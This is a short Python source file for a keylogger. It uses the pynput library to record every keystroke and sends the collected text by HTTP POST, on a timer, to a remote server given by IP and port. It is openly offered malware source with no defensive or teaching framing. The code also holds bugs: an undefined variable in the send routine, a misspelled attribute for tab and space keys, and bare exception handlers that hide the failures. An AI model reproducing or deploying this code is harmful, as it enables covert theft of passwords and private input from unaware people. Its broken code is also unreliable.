from pynput import keyboard

import requests

import json

import threading

class KeyLogger:

    def __init__(self, interval, port, server_ip):
        # global variable text where keystrokes are saved as a string which is sent to server
        self.server_ip = server_ip  
        self.port = port
        self.interval = interval
        self.text = ""
    
    def _send_post_request(self):
        payload = json.dumps({"keyboardData": text})
        try:
            requests.post(f"http://{self.server_ip}:{self.port}", 
                          data=payload, 
                          headers={"Content-Type" : "application/json"}
                          )
        except:
            print("Failed to send log!")

        finally:
            self.text = ""
            timer = threading.Timer(self.interval, self._send_post_request)
            timer.start()

    def _on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.test += "\t"
            elif key == keyboard.Key.space:
                self.test += " "
            elif key == keyboard.Key.backspace:
                self.text =  self.text [:-1]
            elif key == keyboard.Key.esc:
                return False # stops listener
            
            else:
                self.text += str(key).strip("'")
        except:
            pass

    def start(self):
        self._send_post_request()
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()

            